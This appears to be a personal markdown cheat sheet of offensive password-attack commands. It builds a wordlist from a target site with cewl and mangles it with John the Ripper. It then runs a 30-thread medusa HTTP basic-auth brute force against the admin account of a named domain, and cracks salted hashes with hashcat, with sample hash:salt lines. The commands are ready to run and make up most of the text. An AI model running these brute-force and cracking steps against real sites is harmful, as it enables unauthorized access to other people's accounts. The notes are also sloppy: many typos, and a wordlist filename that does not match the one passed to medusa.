## UTILITIES
### dirbuster: brute-force website directories.
- find a login page
- generate word via `cwel`  
 ```cewl www.targetdomain.com -m 6 -w /root/target-dmoain-cewl.txt```
- use `john the ripper` to create mangled passwords list  
``` john --wordlist=/root/target-dmoain-cewl.txt --rules --stdout > mutated.txt ```
- pass the new password file to `medusa` for HTTP basci-auth brute force attach  
```  medusa -h fiprealty.com -u admin -P passwords.txt -M http -n 81 -m DIR:/admin -T 30  ```

### hash-identifier
Locate a password hash, and use `hash-identifier` to reveal the source/type.
> won't always work
- if the hash originates from a known app, you can investigate the app's source code to find how it was generated.
The source code might reveal that the hash was generated by `sha1` + 10 random digits...

### oclHashcat-plus
salt + hashed password cracker
- generate a passwords file
- make sure the 'split' the `hash:salt`, so the proggram can identify it
```
#salt of 10 digits
kjhgldskjhgbkjfgbhfdgbsdfg:yu34gy59p1
khgsjdgk865kn9gjrkjtyo9ujg:y689rkjhty
```
- use your `giant passwords list` (actual hashes:slat list) againt the new (wish to hack) list.
```
./hashcat64.bin -m 500 hash-and-salted-passwords.txt my-big-hashes-salted-ditionary.dict
```
